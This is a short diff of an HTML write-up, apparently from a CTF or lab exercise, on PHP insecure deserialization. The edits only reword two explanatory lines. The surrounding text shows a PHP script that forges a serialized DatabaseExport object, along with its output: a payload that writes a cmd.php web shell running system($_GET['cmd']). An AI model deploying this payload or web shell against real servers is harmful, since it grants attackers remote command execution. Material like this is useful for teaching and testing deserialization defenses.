@@ -789,7 +789,7 @@ $app -&gt; update_db();
 </code></pre>
 <p>&ndash;&gt; PHP Insecure Deserialization</p>
 <p>We can actually create a simple cmd shell</p>
-<p>This is the payload we can to serialize</p>
+<p>We&rsquo;ll use this php script to forge our serialized payload</p>
 <pre><code class="language-php">&lt;?php
 class DatabaseExport
 {
@@ -801,7 +801,7 @@ $bad= new DatabaseExport;
 echo serialize($bad);
 ?&gt;
 </code></pre>
-<p>running this php script will give us</p>
+<p>Output:</p>
 <pre><code class="language-php">O:14:&quot;DatabaseExport&quot;:2:{s:9:&quot;user_file&quot;;s:7:&quot;cmd.php&quot;;s:4:&quot;data&quot;;s:28:&quot;&lt;?php system($_GET[&quot;cmd&quot;])?&gt;&quot;;}
 </code></pre>
 <p>our final payload</p>
